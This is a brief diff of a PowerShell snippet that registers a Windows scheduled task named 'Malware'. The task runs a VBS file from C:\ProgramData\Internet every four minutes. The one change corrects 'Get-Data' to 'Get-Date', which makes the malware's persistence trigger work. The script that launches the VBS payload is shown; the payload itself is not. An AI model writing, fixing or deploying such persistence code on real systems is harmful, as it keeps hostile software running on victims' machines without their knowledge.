@@ -1,7 +1,7 @@
 try
 {
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Internet\Net.vbs'
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Data) -RepetitionInterval (New-TimeSpan -Minutes 4)
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 4)
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Malware"
 start-sleep 3
 
